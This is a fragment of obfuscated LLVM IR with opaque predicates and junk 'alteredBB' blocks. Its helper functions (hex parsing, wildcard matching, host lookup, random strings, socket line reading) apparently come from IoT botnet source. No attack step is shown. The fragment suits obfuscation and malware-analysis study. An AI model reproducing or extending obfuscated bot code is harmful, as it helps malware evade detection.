  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %8, align 4
  br label %9

; <label>:37:                                     ; preds = %25
  %38 = load i32, i32* @x.23
  %39 = load i32, i32* @y.24
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %37
  %46 = load i32, i32* %7, align 4
  %47 = icmp eq i32 %46, 0
  %48 = load i32, i32* @x.23
  %49 = load i32, i32* @y.24
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %47, label %56, label %57

; <label>:56:                                     ; preds = %originalBBpart2
  br label %59

; <label>:57:                                     ; preds = %originalBBpart2
  %58 = load i8*, i8** %4, align 8
  br label %59

; <label>:59:                                     ; preds = %57, %56
  %60 = phi i8* [ null, %56 ], [ %58, %57 ]
  ret i8* %60

originalBBalteredBB:                              ; preds = %originalBB, %37
  %61 = load i32, i32* %7, align 4
  %62 = icmp eq i32 %61, 0
  br label %originalBB
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = load i32, i32* @x.25
  %3 = load i32, i32* @y.26
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  store i8* %0, i8** %10, align 8
  store i64 0, i64* %11, align 8
  %12 = load i32, i32* @x.25
  %13 = load i32, i32* @y.26
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %20

; <label>:20:                                     ; preds = %originalBBpart234, %originalBBpart2
  %21 = load i32, i32* @x.25
  %22 = load i32, i32* @y.26
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %20
  %29 = load i8*, i8** %10, align 8
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp ne i32 %31, 0
  %33 = load i32, i32* @x.25
  %34 = load i32, i32* @y.26
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %32, label %41, label %60

; <label>:41:                                     ; preds = %originalBBpart24
  %42 = load i32, i32* @x.25
  %43 = load i32, i32* @y.26
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %41
  %50 = load i64, i64* %11, align 8
  %51 = icmp sge i64 %50, 0
  %52 = load i32, i32* @x.25
  %53 = load i32, i32* @y.26
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %60

; <label>:60:                                     ; preds = %originalBBpart28, %originalBBpart24
  %61 = phi i1 [ false, %originalBBpart24 ], [ %51, %originalBBpart28 ]
  %62 = load i32, i32* @x.25
  %63 = load i32, i32* @y.26
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %60
  %70 = load i32, i32* @x.25
  %71 = load i32, i32* @y.26
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %61, label %78, label %104

; <label>:78:                                     ; preds = %originalBBpart212
  %79 = load i32, i32* @x.25
  %80 = load i32, i32* @y.26
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %78
  %87 = load i64, i64* %11, align 8
  %88 = shl i64 %87, 4
  %89 = load i8*, i8** %10, align 8
  %90 = getelementptr inbounds i8, i8* %89, i32 1
  store i8* %90, i8** %10, align 8
  %91 = load i8, i8* %89, align 1
  %92 = zext i8 %91 to i64
  %93 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %92
  %94 = load i64, i64* %93, align 8
  %95 = or i64 %88, %94
  store i64 %95, i64* %11, align 8
  %96 = load i32, i32* @x.25
  %97 = load i32, i32* @y.26
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart234, label %originalBB14alteredBB

originalBBpart234:                                ; preds = %originalBB14
  br label %20

; <label>:104:                                    ; preds = %originalBBpart212
  %105 = load i32, i32* @x.25
  %106 = load i32, i32* @y.26
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %104
  %113 = load i64, i64* %11, align 8
  %114 = load i32, i32* @x.25
  %115 = load i32, i32* @y.26
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  ret i64 %113

originalBBalteredBB:                              ; preds = %originalBB, %1
  %122 = alloca i8*, align 8
  %123 = alloca i64, align 8
  store i8* %0, i8** %122, align 8
  store i64 0, i64* %123, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %20
  %124 = load i8*, i8** %10, align 8
  %125 = load i8, i8* %124, align 1
  %126 = zext i8 %125 to i32
  %127 = icmp ne i32 %126, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %41
  %128 = load i64, i64* %11, align 8
  %129 = icmp sge i64 %128, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %60
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %78
  %130 = load i64, i64* %11, align 8
  %_ = sub i64 %130, 4
  %gen = mul i64 %_, 4
  %_15 = shl i64 %130, 4
  %_16 = sub i64 0, %130
  %gen17 = add i64 %_16, 4
  %_18 = sub i64 0, %130
  %gen19 = add i64 %_18, 4
  %_20 = shl i64 %130, 4
  %_21 = shl i64 %130, 4
  %_22 = sub i64 %130, 4
  %gen23 = mul i64 %_22, 4
  %131 = shl i64 %130, 4
  %132 = load i8*, i8** %10, align 8
  %133 = getelementptr inbounds i8, i8* %132, i32 1
  store i8* %133, i8** %10, align 8
  %134 = load i8, i8* %132, align 1
  %135 = zext i8 %134 to i64
  %136 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %135
  %137 = load i64, i64* %136, align 8
  %_24 = sub i64 0, %131
  %gen25 = add i64 %_24, %137
  %_26 = shl i64 %131, %137
  %_27 = sub i64 %131, %137
  %gen28 = mul i64 %_27, %137
  %_29 = sub i64 0, %131
  %gen30 = add i64 %_29, %137
  %_31 = sub i64 0, %131
  %gen32 = add i64 %_31, %137
  %138 = or i64 %131, %137
  store i64 %138, i64* %11, align 8
  br label %originalBB14

originalBB36alteredBB:                            ; preds = %originalBB36, %104
  %139 = load i64, i64* %11, align 8
  br label %originalBB36
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %70 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %53
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %92

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %49

; <label>:19:                                     ; preds = %13
  %20 = load i32, i32* @x.27
  %21 = load i32, i32* @y.28
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  %28 = load i8*, i8** %5, align 8
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp ne i32 %30, 0
  %32 = load i32, i32* @x.27
  %33 = load i32, i32* @y.28
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %31, label %40, label %47

; <label>:40:                                     ; preds = %originalBBpart2
  %41 = load i8*, i8** %4, align 8
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i64 1
  %44 = call i32 @wildString(i8* %41, i8* %43)
  %45 = icmp ne i32 %44, 0
  %46 = xor i1 %45, true
  br label %47

; <label>:47:                                     ; preds = %40, %originalBBpart2
  %48 = phi i1 [ false, %originalBBpart2 ], [ %46, %40 ]
  br label %49

; <label>:49:                                     ; preds = %47, %13
  %50 = phi i1 [ true, %13 ], [ %48, %47 ]
  %51 = xor i1 %50, true
  %52 = zext i1 %51 to i32
  store i32 %52, i32* %3, align 4
  br label %92

; <label>:53:                                     ; preds = %2
  %54 = load i8*, i8** %5, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %58, label %66

; <label>:58:                                     ; preds = %53
  %59 = load i8*, i8** %4, align 8
  %60 = getelementptr inbounds i8, i8* %59, i64 1
  %61 = load i8*, i8** %5, align 8
  %62 = getelementptr inbounds i8, i8* %61, i64 1
  %63 = call i32 @wildString(i8* %60, i8* %62)
  %64 = icmp ne i32 %63, 0
  %65 = xor i1 %64, true
  br label %66

; <label>:66:                                     ; preds = %58, %53
  %67 = phi i1 [ false, %53 ], [ %65, %58 ]
  %68 = xor i1 %67, true
  %69 = zext i1 %68 to i32
  store i32 %69, i32* %3, align 4
  br label %92

; <label>:70:                                     ; preds = %2
  %71 = load i8*, i8** %4, align 8
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = call i32 @toupper(i32 %73) #10
  %75 = load i8*, i8** %5, align 8
  %76 = load i8, i8* %75, align 1
  %77 = zext i8 %76 to i32
  %78 = call i32 @toupper(i32 %77) #10
  %79 = icmp eq i32 %74, %78
  br i1 %79, label %80, label %88

; <label>:80:                                     ; preds = %70
  %81 = load i8*, i8** %4, align 8
  %82 = getelementptr inbounds i8, i8* %81, i64 1
  %83 = load i8*, i8** %5, align 8
  %84 = getelementptr inbounds i8, i8* %83, i64 1
  %85 = call i32 @wildString(i8* %82, i8* %84)
  %86 = icmp ne i32 %85, 0
  %87 = xor i1 %86, true
  br label %88

; <label>:88:                                     ; preds = %80, %70
  %89 = phi i1 [ false, %70 ], [ %87, %80 ]
  %90 = xor i1 %89, true
  %91 = zext i1 %90 to i32
  store i32 %91, i32* %3, align 4
  br label %92

; <label>:92:                                     ; preds = %88, %66, %49, %9
  %93 = load i32, i32* %3, align 4
  ret i32 %93

originalBBalteredBB:                              ; preds = %originalBB, %19
  %94 = load i8*, i8** %5, align 8
  %95 = load i8, i8* %94, align 1
  %96 = zext i8 %95 to i32
  %97 = icmp ne i32 %96, 0
  br label %originalBB
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %30

; <label>:13:                                     ; preds = %2
  %14 = load i32, i32* @x.29
  %15 = load i32, i32* @y.30
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %13
  store i32 0, i32* %3, align 4
  %22 = load i32, i32* @x.29
  %23 = load i32, i32* @y.30
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %30

; <label>:30:                                     ; preds = %originalBBpart2, %12
  %31 = load i32, i32* @x.29
  %32 = load i32, i32* @y.30
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %30
  %39 = load i32, i32* %3, align 4
  %40 = load i32, i32* @x.29
  %41 = load i32, i32* @y.30
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %39

originalBBalteredBB:                              ; preds = %originalBB, %13
  store i32 0, i32* %3, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %30
  %48 = load i32, i32* %3, align 4
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

; <label>:7:                                      ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #10
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3

; <label>:16:                                     ; preds = %3
  %17 = load i32, i32* @x.31
  %18 = load i32, i32* @y.32
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = load i32, i32* @x.31
  %26 = load i32, i32* @y.32
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %16
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = load i32, i32* @x.33
  %4 = load i32, i32* @y.34
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  store i32 0, i32* %13, align 4
  store i32 0, i32* %13, align 4
  %14 = load i32, i32* @x.33
  %15 = load i32, i32* @y.34
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %22

; <label>:22:                                     ; preds = %originalBBpart232, %originalBBpart2
  %23 = load i32, i32* @x.33
  %24 = load i32, i32* @y.34
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %22
  %31 = load i32, i32* %13, align 4
  %32 = load i32, i32* %12, align 4
  %33 = icmp slt i32 %31, %32
  %34 = load i32, i32* @x.33
  %35 = load i32, i32* @y.34
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %33, label %42, label %86

; <label>:42:                                     ; preds = %originalBBpart24
  %43 = load i32, i32* @x.33
  %44 = load i32, i32* @y.34
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %42
  %51 = call i32 @rand_cmwc()
  %52 = urem i32 %51, 26
  %53 = add i32 %52, 65
  %54 = trunc i32 %53 to i8
  %55 = load i8*, i8** %11, align 8
  %56 = load i32, i32* %13, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %55, i64 %57
  store i8 %54, i8* %58, align 1
  %59 = load i32, i32* @x.33
  %60 = load i32, i32* @y.34
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart227, label %originalBB6alteredBB

originalBBpart227:                                ; preds = %originalBB6
  br label %67

; <label>:67:                                     ; preds = %originalBBpart227
  %68 = load i32, i32* @x.33
  %69 = load i32, i32* @y.34
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %67
  %76 = load i32, i32* %13, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %13, align 4
  %78 = load i32, i32* @x.33
  %79 = load i32, i32* @y.34
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart232, label %originalBB29alteredBB

originalBBpart232:                                ; preds = %originalBB29
  br label %22

; <label>:86:                                     ; preds = %originalBBpart24
  %87 = load i32, i32* @x.33
  %88 = load i32, i32* @y.34
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %86
  %95 = load i32, i32* @x.33
  %96 = load i32, i32* @y.34
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %103 = alloca i8*, align 8
  %104 = alloca i32, align 4
  %105 = alloca i32, align 4
  store i8* %0, i8** %103, align 8
  store i32 %1, i32* %104, align 4
  store i32 0, i32* %105, align 4
  store i32 0, i32* %105, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %22
  %106 = load i32, i32* %13, align 4
  %107 = load i32, i32* %12, align 4
  %108 = icmp slt i32 %106, %107
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %42
  %109 = call i32 @rand_cmwc()
  %_ = shl i32 %109, 26
  %_7 = sub i32 %109, 26
  %gen = mul i32 %_7, 26
  %_8 = sub i32 %109, 26
  %gen9 = mul i32 %_8, 26
  %_10 = sub i32 %109, 26
  %gen11 = mul i32 %_10, 26
  %110 = urem i32 %109, 26
  %_12 = sub i32 0, %110
  %gen13 = add i32 %_12, 65
  %_14 = sub i32 0, %110
  %gen15 = add i32 %_14, 65
  %_16 = sub i32 %110, 65
  %gen17 = mul i32 %_16, 65
  %_18 = sub i32 %110, 65
  %gen19 = mul i32 %_18, 65
  %_20 = shl i32 %110, 65
  %_21 = sub i32 0, %110
  %gen22 = add i32 %_21, 65
  %_23 = sub i32 %110, 65
  %gen24 = mul i32 %_23, 65
  %111 = add i32 %110, 65
  %112 = trunc i32 %111 to i8
  %113 = load i8*, i8** %11, align 8
  %114 = load i32, i32* %13, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds i8, i8* %113, i64 %115
  store i8 %112, i8* %116, align 1
  br label %originalBB6

originalBB29alteredBB:                            ; preds = %originalBB29, %67
  %117 = load i32, i32* %13, align 4
  %_30 = shl i32 %117, 1
  %118 = add nsw i32 %117, 1
  store i32 %118, i32* %13, align 4
  br label %originalBB29

originalBB34alteredBB:                            ; preds = %originalBB34, %86
  br label %originalBB34
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = load i32, i32* @x.35
  %5 = load i32, i32* @y.36
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca %struct.__sigset_t, align 8
  %17 = alloca %struct.timeval, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  store i32 %0, i32* %13, align 4
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  %27 = load i8*, i8** %14, align 8
  %28 = load i32, i32* %15, align 4
  %29 = sext i32 %28 to i64
  call void @llvm.memset.p0i8.i64(i8* %27, i8 0, i64 %29, i32 1, i1 false)
  %30 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 0
  store i64 30, i64* %30, align 8
  %31 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 1
  store i64 0, i64* %31, align 8
  %32 = load i32, i32* @x.35
  %33 = load i32, i32* @y.36
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %40

; <label>:40:                                     ; preds = %originalBBpart2
  %41 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %16, i32 0, i32 0
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %41, i64 0, i64 0
  %43 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %42) #2, !srcloc !1
  %44 = extractvalue { i64, i64* } %43, 0
  %45 = extractvalue { i64, i64* } %43, 1
  %46 = trunc i64 %44 to i32
  store i32 %46, i32* %18, align 4
  %47 = ptrtoint i64* %45 to i64
  %48 = trunc i64 %47 to i32
  store i32 %48, i32* %19, align 4
  br label %49

; <label>:49:                                     ; preds = %40
  %50 = load i32, i32* %13, align 4
  %51 = srem i32 %50, 64
  %52 = zext i32 %51 to i64
  %53 = shl i64 1, %52
  %54 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %16, i32 0, i32 0
  %55 = load i32, i32* %13, align 4
  %56 = sdiv i32 %55, 64
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds [16 x i64], [16 x i64]* %54, i64 0, i64 %57
  %59 = load i64, i64* %58, align 8
